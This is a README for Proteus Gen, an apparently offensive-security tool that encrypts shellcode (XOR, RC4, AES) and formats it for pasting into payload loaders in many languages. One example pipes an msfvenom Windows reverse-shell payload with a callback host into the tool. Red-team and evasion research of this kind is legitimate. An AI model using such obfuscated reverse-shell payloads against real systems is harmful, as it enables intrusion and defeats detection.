# Proteus Gen

```
 ██▓███   ██▀███   ▒█████  ▄▄▄█████▓▓█████  █    ██   ██████ 
▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓█   ▀  ██  ▓██▒▒██    ▒ 
▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒███   ▓██  ▒██░░ ▓██▄   
▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ▒▓█  ▄ ▓▓█  ░██░  ▒   ██▒
▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░▒████▒▒▒█████▓ ▒██████▒▒
▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░░ ▒░ ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░     ░     ░ ░  ░░░▒░ ░ ░ ░ ░▒  ░ ░
░░         ░░   ░ ░ ░ ░ ▒    ░         ░    ░░░ ░ ░ ░  ░  ░  
            ░         ░ ░              ░  ░   ░           ░  
         Proteus: Simple Shellcode Obfuscator
```

A command-line shellcode encryptor and formatter. Proteus takes raw shellcode, optionally encrypts it, and outputs it as a ready-to-paste array or string in your language of choice.

> **Disclaimer:** This tool is distributed for educational and authorized security research purposes only. The author is not responsible for any misuse. Always ensure you have explicit permission before testing on any system you do not own.

---

## Features

- **3 encryption algorithms** — XOR, RC4, AES-256-CBC
- **15 output formats** — covering all major languages used in loader development
- **3 key modes** — randomly generated, hex-supplied, or passphrase-derived
- **Stdin support** — pipe shellcode directly from tools like `msfvenom`
- **Matching key output** — the encryption key is printed in the same language/format as the payload so both can be copied straight into your loader

---

## Requirements

Python 3.7 or higher.

```bash
pip install -r requirements.txt
```

**requirements.txt**
```
pycryptodome
colorama
```

---

## Installation

```bash
git clone https://github.com/0xOceanus/Proteus-Gen.git
cd proteus-gen
pip install -r requirements.txt
python3 proteus_gen.py --help
```

---

## Usage

```
python3 proteus_gen.py -i <input> -f <format> [options]
```

### Arguments

| Flag | Long | Required | Description |
|---|---|---|---|
| `-i` | `--input` | ✅ | Path to the raw shellcode file, or `-` to read from stdin |
| `-f` | `--format` | ✅ | Output format (see table below) |
| `-o` | `--output` | ❌ | Write output to a file instead of printing to stdout |
| `-e` | `--enc` | ❌ | Encryption algorithm to apply (`xor`, `rc4`, `aes`) |
| `-k` | `--key` | ❌ | Hex-encoded encryption key (mutually exclusive with `-p`) |
| `-p` | `--passphrase` | ❌ | Plain-text passphrase for key derivation (mutually exclusive with `-k`) |

---

## Output Formats

| Flag value | Language / Format | Declaration style |
|---|---|---|
| `c` | C | `unsigned char buf[] = { 0xfc, 0xe8, ... };` |
| `csharp` | C# | `byte[] buf = new byte[N] { 0xfc, 0xe8, ... };` |
| `golang` | Go | `buf := []byte{ 0xfc, 0xe8, ... }` |
| `java` | Java | `byte[] buf = new byte[] { (byte)0xfc, ... };` |
| `js` | JavaScript | `var buf = new Uint8Array([ 0xfc, 0xe8, ... ]);` |
| `nim` | Nim | `var buf: array[N, byte] = [ byte 0xfc, ... ]` |
| `php` | PHP | `$buf = "\xfc\xe8\x82...";` |
| `powershell` | PowerShell | `[Byte[]] $buf = 0xfc, 0xe8, ...` |
| `python` | Python | `buf = b"\xfc\xe8\x82..."` |
| `ruby` | Ruby | `buf = "\xfc\xe8\x82..."` |
| `rust` | Rust | `let buf: [u8; N] = [ 0xfc, 0xe8, ... ];` |
| `zig` | Zig | `const buf = [_]u8{ 0xfc, 0xe8, ... };` |
| `base64` | Base64 string | `AAEC...` |
| `hex` | Hex string | `fc e8 82...` |
| `raw` | Raw binary | Written to a `.bin` file |

---

## Encryption Algorithms

| Flag value | Algorithm | Key size | Notes |
|---|---|---|---|
| `xor` | XOR | 1 byte (random/hex) or passphrase length | Random and hex keys use single-byte XOR. Passphrase keys use repeating/cycling multi-byte XOR |
| `rc4` | RC4 | 32 bytes | Stream cipher |
| `aes` | AES-256-CBC | 32 bytes | IV is randomly generated and prepended to the ciphertext |

---

## Key Modes

The three key modes are mutually exclusive. If no key flag is given, a random key is generated.

### Random (default)

No flag needed. A cryptographically random key is generated and printed alongside the payload.

```bash
python3 proteus_gen.py -i shellcode.bin -f c -e aes
```

### Hex key (`-k`)

Supply a hex-encoded key of the exact required length. The key is used as-is.

| Algorithm | Required length |
|---|---|
| XOR | 2 hex chars (1 byte) |
| RC4 | 64 hex chars (32 bytes) |
| AES | 64 hex chars (32 bytes) |

```bash
python3 proteus_gen.py -i shellcode.bin -f c -e xor -k "ff"
python3 proteus_gen.py -i shellcode.bin -f c -e aes -k "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
```

### Passphrase (`-p`)

Supply a plain-text passphrase. The key is derived from it automatically.

| Algorithm | Derivation method |
|---|---|
| XOR | Raw passphrase bytes used directly as a repeating/cycling key |
| RC4 | SHA-256 hash of the passphrase (produces 32 bytes) |
| AES | SHA-256 hash of the passphrase (produces 32 bytes) |

Derivation is deterministic — the same passphrase always produces the same key, so you can reproduce results later.

```bash
python3 proteus_gen.py -i shellcode.bin -f c -e aes -p "MySecretPassphrase"
python3 proteus_gen.py -i shellcode.bin -f golang -e xor -p "MySecretPassphrase"
```

---

## Examples

### Basic — no encryption, C output

```bash
python3 proteus_gen.py -i shellcode.bin -f c
```

```c
unsigned char buf[] = {
  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,
  ...
};
```

### AES-256 with a random key, PowerShell output

```bash
python3 proteus_gen.py -i shellcode.bin -f powershell -e aes
```

```
[*] Encryption:  AES
[*] Key source:  randomly generated

[+] Key (powershell):
[Byte[]] $key = 0xa3, 0x1f, ...

[+] Final payload:
[Byte[]] $buf = 0x9f, 0x3c, ...
```

### RC4 with a passphrase, Rust output

```bash
python3 proteus_gen.py -i shellcode.bin -f rust -e rc4 -p "MySecretPassphrase"
```

```rust
let key: [u8; 32] = [0x57, 0x0e, ...];

let buf: [u8; 512] = [
    0x9f, 0x3c, 0x1a, ...
];
```

### XOR with a passphrase (multi-byte cycling), Go output

```bash
python3 proteus_gen.py -i shellcode.bin -f golang -e xor -p "CyclingKey"
```

### Write raw binary output to disk

When `-f raw` is used, both the encrypted shellcode and the key are written to uniquely named `.bin` and `.key` files automatically.

```bash
python3 proteus_gen.py -i shellcode.bin -f raw -e aes -p "MyPassphrase"
# shellcode_<uuid>.bin  ← encrypted payload
# key_<uuid>.key        ← raw key bytes
```

### Write formatted output to a file

```bash
python3 proteus_gen.py -i shellcode.bin -f c -e aes -o loader_buf.c
```

### Pipe from msfvenom (stdin support)

Use `-i -` to read shellcode from stdin, making Proteus composable with other tools.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw | \
  python3 proteus_gen.py -i - -f c -e aes -p "MyPassphrase"
```

```bash
cat shellcode.bin | python3 proteus_gen.py -i - -f rust -e rc4
```

---

## Notes

**AES IV handling** — The IV is randomly generated per run and prepended to the ciphertext. Your decryption stub must read the first 16 bytes as the IV before decrypting the remainder.

**XOR key behaviour** — Single-byte XOR (random or hex key) and multi-byte cycling XOR (passphrase) produce different ciphertext even for the same input. Make sure your decryption stub matches the mode used.

**Passphrase security** — SHA-256 applied directly to a passphrase has no brute-force resistance against short or guessable passphrases. For stronger key derivation, consider replacing the derivation with PBKDF2 and storing the salt alongside the ciphertext.

---

## Author

**0xOceanus** — [github.com/0xOceanus](https://github.com/0xOceanus)
